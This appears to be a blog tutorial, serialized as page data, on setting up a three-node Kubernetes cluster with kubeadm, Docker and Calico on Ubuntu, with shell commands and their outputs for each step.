href=\"#method-2-disable-the-firewall\">#</a> Method 2: Disable the firewall</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt command</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw status</span><br><span class=\"line\">Status: active</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw <span class=\"built_in\">disable</span></span><br><span class=\"line\">Firewall stopped and disabled on system startup</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw status</span><br><span class=\"line\">Status: inactive</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-docker-engine\"><a class=\"markdownIt-Anchor\" href=\"#installing-docker-engine\">#</a> Installing Docker Engine</h3>\n<p>Kubernetes requires you to install a container runtime to work correctly.There are many available options like containerd, CRI-O, Docker etc</p>\n<p>By default, Kubernetes uses the Container Runtime Interface (CRI) to interface with your chosen container runtime.If you don’t specify a runtime, kubeadm automatically tries to detect an installed container runtime by scanning through a list of known endpoints.</p>\n<p>You must install the Docker Engine on each node!</p>\n<h4 id=\"1-set-up-the-repository\"><a class=\"markdownIt-Anchor\" href=\"#1-set-up-the-repository\">#</a> 1- Set up the repository</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-add-dockers-official-gpg-key\"><a class=\"markdownIt-Anchor\" href=\"#2-add-dockers-official-gpg-key\">#</a> 2- Add Docker’s official GPG key</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">mkdir</span> -p /etc/apt/keyrings</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-add-the-stable-repository-using-the-following-command\"><a class=\"markdownIt-Anchor\" href=\"#3-add-the-stable-repository-using-the-following-command\">#</a> 3- Add the stable repository using the following command:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">echo</span> \\</span><br><span class=\"line\">  <span class=\"string\">&quot;deb [arch=<span class=\"subst\">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\</span></span><br><span class=\"line\"><span class=\"string\">  <span class=\"subst\">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-install-the-docker-container\"><a class=\"markdownIt-Anchor\" href=\"#4-install-the-docker-container\">#</a> 4- Install the docker container</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update &amp;&amp; sudo apt install docker-ce docker-ce-cli containerd.io -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-make-sure-that-the-docker-will-work-on-system-startup\"><a class=\"markdownIt-Anchor\" href=\"#5-make-sure-that-the-docker-will-work-on-system-startup\">#</a> 5- Make sure that the docker will work on system startup</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo systemctl <span class=\"built_in\">enable</span> --now docker </span><br></pre></td></tr></table></figure>\n<h4 id=\"6-configuring-cgroup-driver\"><a class=\"markdownIt-Anchor\" href=\"#6-configuring-cgroup-driver\">#</a> 6- Configuring Cgroup Driver:</h4>\n<p>The Cgroup Driver must be configured to let the kubelet process work correctly</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">cat</span> &lt;&lt;<span class=\"string\">EOF | sudo tee /etc/docker/daemon.json</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class=\"line\"><span class=\"string\">  &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class=\"line\"><span class=\"string\">  &quot;log-opts&quot;: &#123;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class=\"line\"><span class=\"string\">  &#125;,</span></span><br><span class=\"line\"><span class=\"string\">  &quot;storage-driver&quot;: &quot;overlay2&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"7-restart-the-docker-service-to-make-sure-the-new-configuration-is-applied\"><a class=\"markdownIt-Anchor\" href=\"#7-restart-the-docker-service-to-make-sure-the-new-configuration-is-applied\">#</a> 7- Restart the docker service to make sure the new configuration is applied</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-kubernetes-kubeadm-kubelet-and-kubectl\"><a class=\"markdownIt-Anchor\" href=\"#installing-kubernetes-kubeadm-kubelet-and-kubectl\">#</a> Installing kubernetes (kubeadm, kubelet, and kubectl):</h3>\n<p>Install the following dependency required by Kubernetes on each node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt install apt-transport-https</span><br></pre></td></tr></table></figure>\n<h4 id=\"download-the-google-cloud-public-signing-key\"><a class=\"markdownIt-Anchor\" href=\"#download-the-google-cloud-public-signing-key\">#</a> Download the Google Cloud public signing key:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg</span><br></pre></td></tr></table></figure>\n<h4 id=\"add-the-kubernetes-apt-repository\"><a class=\"markdownIt-Anchor\" href=\"#add-the-kubernetes-apt-repository\">#</a> Add the Kubernetes apt repository:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/kubernetes.list</span><br></pre></td></tr></table></figure>\n<h4 id=\"update-the-apt-package-index-and-install-kubeadm-kubelet-and-kubeclt\"><a class=\"markdownIt-Anchor\" href=\"#update-the-apt-package-index-and-install-kubeadm-kubelet-and-kubeclt\">#</a> Update the apt package index and install kubeadm, kubelet, and kubeclt</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update &amp;&amp; sudo apt install -y kubelet=1.23.1-00 kubectl=1.23.1-00 kubeadm=1.23.1-00</span><br></pre></td></tr></table></figure>\n<h2 id=\"initializing-the-control-plane-node\"><a class=\"markdownIt-Anchor\" href=\"#initializing-the-control-plane-node\">#</a> Initializing the control-plane node</h2>\n<p>At this point, we have 3 nodes with docker,  <code>kubeadm</code> ,  <code>kubelet</code> , and  <code>kubectl</code>  installed. Now we must initialize the Kubernetes master, which will manage the whole cluster and the pods running within the cluster  <code>kubeadm init</code>  by specifiy the address of the master node and the ipv4 address pool of the pods</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo kubeadm init --apiserver-advertise-address=192.168.1.18 --pod-network-cidr=10.1.0.0/16</span><br></pre></td></tr></table></figure>\n<p>You should wait a few minutes until the initialization is completed. The first initialization will take a lot of time if your connexion speed is slow (pull the images of the cluster components)</p>\n<h3 id=\"configuring-kubectl\"><a class=\"markdownIt-Anchor\" href=\"#configuring-kubectl\">#</a> Configuring kubectl</h3>\n<p>As known, the  <code>kubectl</code>  is a command line tool for performing actions on your cluster. So we must to configure  <code>kubectl</code> . Run the following command from your master node:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">mkdir</span> -p <span class=\"variable\">$HOME</span>/.kube</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">cp</span> -i /etc/kubernetes/admin.conf <span class=\"variable\">$HOME</span>/.kube/config</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">chown</span> $(<span class=\"built_in\">id</span> -u):$(<span class=\"built_in\">id</span> -g) <span class=\"variable\">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-calico-cni\"><a class=\"markdownIt-Anchor\" href=\"#installing-calico-cni\">#</a> Installing Calico CNI</h3>\n<p>Calico provides network and network security solutions for containers. Calico is best known for its performance, flexibility and power. Use-cases: Calico can be used within a lot of Kubernetes platforms (kops, Kubespray, docker enterprise, etc.) to block or allow traffic between pods, namespaces</p>\n<h4 id=\"1-install-tigera-calico-operator\"><a class=\"markdownIt-Anchor\" href=\"#1-install-tigera-calico-operator\">#</a> 1- Install Tigera Calico operator</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl create -f <span class=\"string\">&quot;https://projectcalico.docs.tigera.io/manifests/tigera-operator.yaml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>The Tigera Operator is a Kubernetes operator which manages the lifecycle of a Calico or Calico Enterprise installation on Kubernetes. Its goal is to make installation, upgrades, and ongoing lifecycle management of Calico and Calico Enterprise as simple and reliable as possible.</p>\n<h4 id=\"2-download-the-custom-resourcesyaml-manifest-and-change-it\"><a class=\"markdownIt-Anchor\" href=\"#2-download-the-custom-resourcesyaml-manifest-and-change-it\">#</a> 2- Download the custom-resources.yaml manifest and change it</h4>\n<p>The Calico has a default pod’s CIDR value. But in our example, we set the   <code>--pod-netwokr-cidr=10.1.0.0/16</code> . So we must change the value of pod network CIDR in  <code>custom-resources.yaml</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ wget  <span class=\"string\">&quot;https://projectcalico.docs.tigera.io/manifests/custom-resources.yaml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Now we edit this file before create the Calico pods</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># This section includes base Calico installation configuration.</span></span><br><span class=\"line\"><span class=\"comment\"># For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.Installation</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">operator.tigera.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Installation</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"comment\"># Configures Calico networking.</span></span><br><span class=\"line\">  <span class=\"attr\">calicoNetwork:</span></span><br><span class=\"line\">    <span class=\"comment\"># <span class=\"doctag\">Note:</span> The ipPools section cannot be modified post-install.</span></span><br><span class=\"line\">    <span class=\"attr\">ipPools:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">blockSize:</span> <span class=\"number\">26</span></span><br><span class=\"line\">      <span class=\"attr\">cidr:</span> <span class=\"number\">10.1</span><span class=\"number\">.0</span><span class=\"number\">.0</span><span class=\"string\">/16</span> <span class=\"comment\">#change this value with yours</span></span><br><span class=\"line\">      <span class=\"attr\">encapsulation:</span> <span class=\"string\">VXLANCrossSubnet</span></span><br><span class=\"line\">      <span class=\"attr\">natOutgoing:</span> <span class=\"string\">Enabled</span></span><br><span class=\"line\">      <span class=\"attr\">nodeSelector:</span> <span class=\"string\">all()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"comment\"># This section configures the Calico API server.</span></span><br><span class=\"line\"><span class=\"comment\"># For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.APIServer</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">operator.tigera.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">APIServer</span> </span><br><span class=\"line\"><span class=\"attr\">metadata:</span> </span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">default</span> </span><br><span class=\"line\"><span class=\"attr\">spec:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>After Editing the  <code>custom-resources.yaml</code>  file. Run the following command:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl create -f <span class=\"string\">&quot;custom-resources.yaml&quot;</span> </span><br></pre></td></tr></table></figure>\n<p>Before you can use the cluster, you must wait for the pods required by Calico to be downloaded. You must wait until you find all the pods running and ready!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pods --all-namespaces</span><br><span class=\"line\">NAMESPACE          NAME                                       READY   STATUS    RESTARTS       AGE</span><br><span class=\"line\">calico-apiserver   calico-apiserver-5989576d6d-5nw7n          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-apiserver   calico-apiserver-5989576d6d-h677h          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-kube-controllers-69cfd64db4-9hnh5   1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-node-lshdl                          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-typha-76dd7c96d7-88826              1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        coredns-64897985d-jkpwh                    1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        coredns-64897985d-zk9wx                    1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        etcd-master                                1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-apiserver-master                      1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-controller-manager-master             1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-proxy-4nf4q                           1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-scheduler-master                      1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">tigera-operator    tigera-operator-7d8c9d4f67-j5b2g           1/1     Running   2 (103s ago)    4min</span><br></pre></td></tr></table></figure>\n<h2 id=\"join-the-worker-nodes\"><a class=\"markdownIt-Anchor\" href=\"#join-the-worker-nodes\">#</a> Join the worker nodes</h2>\n<p>Now our cluster is ready to work! let’s join the worker nodes to this cluster by getting the token from the master node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo kubeadm token create --print-join-command</span><br><span class=\"line\">kubeadm <span class=\"built_in\">join</span> 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt --discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec</span><br></pre></td></tr></table></figure>\n<p>Now let’s move to the worker node and run the following command given by  <code>kubeadm token create</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo kubeadm <span class=\"built_in\">join</span> 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt </span><br><span class=\"line\">\\--discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec</span><br></pre></td></tr></table></figure>\n<p>The output must be similar to the following</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[preflight] Running pre-flight checks</span><br><span class=\"line\">[preflight] Reading configuration from the cluster...</span><br><span class=\"line\">[preflight] FYI: You can look at this config file with <span class=\"string\">&#x27;kubectl -n kube-system get cm kubeadm-config -o yaml&#x27;</span></span><br><span class=\"line\">W0623 12:45:07.940655   23651 utils.go:69] The recommended value <span class=\"keyword\">for</span> <span class=\"string\">&quot;resolvConf&quot;</span> <span class=\"keyword\">in</span> <span class=\"string\">&quot;KubeletConfiguration&quot;</span> is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf</span><br><span class=\"line\">[kubelet-start] Writing kubelet configuration to file <span class=\"string\">&quot;/var/lib/kubelet/config.yaml&quot;</span></span><br><span class=\"line\">[kubelet-start] Writing kubelet environment file with flags to file <span class=\"string\">&quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span></span><br><span class=\"line\">[kubelet-start] Starting the kubelet</span><br><span class=\"line\">[kubelet-start] Waiting <span class=\"keyword\">for</span> the kubelet to perform the TLS Bootstrap...</span><br><span class=\"line\"></span><br><span class=\"line\">This node has joined the cluster:</span><br><span class=\"line\">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class=\"line\">* The Kubelet was informed of the new secure connection details.</span><br><span class=\"line\"></span><br><span class=\"line\">Run <span class=\"string\">&#x27;kubectl get nodes&#x27;</span> on the control-plane to see this node <span class=\"built_in\">join</span> the cluster.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Now let’s Check the cluster by running  <code>kubectl get nodes</code>  command on the master node.</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get nodes</span><br><span class=\"line\"></span><br><span class=\"line\">NAME              STATUS     ROLES                  AGE    VERSION</span><br><span class=\"line\">4n6nk8s-master    Ready      control-plane,master   40m5s  v1.23.1</span><br><span class=\"line\">4n6nk8s-worker1   Ready      &lt;none&gt;                 3m7s   v1.23.1</span><br><span class=\"line\">4n6nk8s-worker2   Ready      &lt;none&gt;                 2m3s   v1.23.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> References:</h2>\n<div class=\"links\"><div class=\"item\" title=\"Kubernetes Documentation\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3Mvc2V0dXAvcHJvZHVjdGlvbi1lbnZpcm9ubWVudC90b29scy9rdWJlYWRtL2NyZWF0ZS1jbHVzdGVyLWt1YmVhZG0v\" data-background-image=\"https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Kubernetes_logo_without_workmark.svg/1200px-Kubernetes_logo_without_workmark.svg.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3Mvc2V0dXAvcHJvZHVjdGlvbi1lbnZpcm9ubWVudC90b29scy9rdWJlYWRtL2NyZWF0ZS1jbHVzdGVyLWt1YmVhZG0v\">Kubernetes Documentation</span>\n          <p class=\"desc\">Creating a cluster with kubeadm</p>\n          </div></div><div class=\"item\" title=\"Calico Documentation\" style=\"--block-color:#FB7031;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9wcm9qZWN0Y2FsaWNvLmRvY3MudGlnZXJhLmlvL2dldHRpbmctc3RhcnRlZC9rdWJlcm5ldGVzL3NlbGYtbWFuYWdlZC1vbnByZW0vb25wcmVtaXNlcw==\" data-background-image=\"https://projectcalico.docs.tigera.io/images/favicon.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9wcm9qZWN0Y2FsaWNvLmRvY3MudGlnZXJhLmlvL2dldHRpbmctc3RhcnRlZC9rdWJlcm5ldGVzL3NlbGYtbWFuYWdlZC1vbnByZW0vb25wcmVtaXNlcw==\">Calico Documentation</span>\n          <p class=\"desc\">Install Calico Networking for on-premises deployments</p>\n          </div></div><div class=\"item\" title=\"Docker Documentation\" style=\"--block-color:#31bffb;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvdWJ1bnR1Lw==\" data-background-image=\"https://www.docker.com/wp-content/uploads/2022/05/Docker_Temporary_Image_Google_Blue_1080x1080_v1.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvdWJ1bnR1Lw==\">Docker Documentation</span>\n          <p class=\"desc\">Install Docker Engine on Ubuntu</p>\n          </div></div></div>\n","site":{"data":{}},"length":11445,"excerpt":"","more":"<p><span class=\"red\">Kubeadm</span> is a tool used to build Kubernetes (K8s) clusters. Kubeadm performs the actions necessary to get a minimum viable cluster up and running quickly. By design, it cares only about bootstrapping, not about provisioning machines (underlying worker and master nodes).</p>\n<div class=\"note success\">\n<p>Knowing how to use kubeadm is required for CKA and CKS exams</p>\n</div>\n<p>We configure a 3 <span class=\"pinky\">Ubuntu 20.04 LTS</span> machines in the same network with the following proprietes:</p>\n<table>\n<thead>\n<tr>\n<th>Role</th>\n<th>Hostname</th>\n<th>IP address</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Master</td>\n<td>4n6nk8s-master</td>\n<td>192.168.1.18/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker1</td>\n<td>192.168.1.19/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker2</td>\n<td>192.168.1.20/24</td>\n</tr>\n</tbody>\n</table>\n<blockquote>\n<p>Note: Make sure to setup a unique hostname for each host</p>\n</blockquote>\n<h2 id=\"prepare-the-environments\"><a class=\"markdownIt-Anchor\" href=\"#prepare-the-environments\">#</a> Prepare the environments</h2>\n<p>The following Steps must be applied to each node (both master nodes and worker nodes)</p>\n<h3 id=\"disable-the-swap-memory\"><a class=\"markdownIt-Anchor\" href=\"#disable-the-swap-memory\">#</a> Disable the Swap Memory</h3>\n<p>The Kubernetes requires that you disable the swap memory in the host system because the kubernetes scheduler determines the best available node on which to deploy newly created pods. If memory swapping is allowed to occur on a host system, this can lead to performance and stability issues within Kubernetes</p>\n<p>You can disable the swap memory by deleting or commenting the swap entry in  <code>/etc/fstab</code>  manually or using the  <code>sed</code>  command</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master$ sudo swapoff -a &amp;&amp; sudo sed -i <span class=\"string\">&#x27;/ swap / s/^\\(.*\\)$/#\\1/g&#x27;</span> /etc/fstab</span><br></pre></td></tr></table></figure>\n<p>This command disbales the swap memory and comments out the swap entry in  <code>/etc/fstab</code></p>\n<h3 id=\"configure-or-disable-the-firewall\"><a class=\"markdownIt-Anchor\" href=\"#configure-or-disable-the-firewall\">#</a> Configure or Disable the firewall</h3>\n<p>When running Kubernetes in an environment with strict network boundaries, such as on-premises datacenter with physical network firewalls or Virtual Networks in Public Cloud, it is useful to be aware of the ports and protocols used by Kubernetes components.</p>\n<p>The ports used by Master Node:</p>\n<table>\n<thead>\n<tr>\n<th>Protocol</th>\n<th>Direction</th>\n<th>Port Range</th>\n<th>Purpose</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>6443</td>\n<td>Kubernetes API server</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>2379-2380</td>\n<td>etcd server client API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10250</td>\n<td>Kubelet API</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10259</td>\n<td>kube-scheduler</td>\n</tr>\n<tr>\n<td>TCP</td>\n<td>Inbound</td>\n<td>10257</td>\n<td>kube-controller-manager</td>\n</tr>\n</tbody>\n</table>\n<p>The ports used by Worker Nodes:</p>\n<table>\n<thead>\n<tr>\n<th>Protocol</th>\n<th>Direction</th>\n<th>Port 